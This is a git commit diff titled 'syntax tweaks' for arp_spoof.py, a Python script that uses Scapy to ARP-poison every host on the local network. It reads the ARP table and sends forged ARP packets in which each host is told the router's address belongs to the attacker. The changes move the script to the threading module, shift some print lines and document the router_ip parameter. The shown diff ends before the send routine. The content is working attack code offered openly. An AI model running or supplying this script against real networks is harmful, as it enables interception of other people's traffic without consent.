bd83abbfceedf9e2864cfb713add39fd448ec4fb
Daniel Nazarian <naz1229@hotmail.com>
2020-09-13 21:09:29 -0400

    syntax tweaks

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,5 +1,5 @@
-import _thread
 import os
+import threading
 
 from scapy.all import *
 from scapy.layers.l2 import ARP
@@ -9,24 +9,25 @@ from scapy.sendrecv import send
 # arp_spoof.py
 # this is a simply python program/script that will perform a simple ARP spoof
 # attack on all hosts on the local network using the Scapy Python library
+# PARAM
+# router_ip (str)       - IP address of router on local network, address to spoof
 
 
 def start_arp_spoof(router_ip='172.16.119.1'):
 	# get ip addresses of machines on local network
-	print("========================================")
+	print("// ARP SPOOF ========================================")
 	full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
 	final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
 	final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
-	print("LOCAL IPS")
-	for res in final_results:
-		print("\t- " + str(res))
 
 	# loop through and poison ALL hosts
 	spoof = router_ip
 	op = 1  # Op code 1 for ARP requests
+	print("LOCAL IPS")
 	for res in final_results:
+		print("\t- " + str(res))
 		arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])
-		_thread.start_new_thread(do_arp_spoof, (arp,))
+		threading.Thread(target=do_arp_spoof, args=(arp,)).start()
 
 
 def do_arp_spoof(arp):
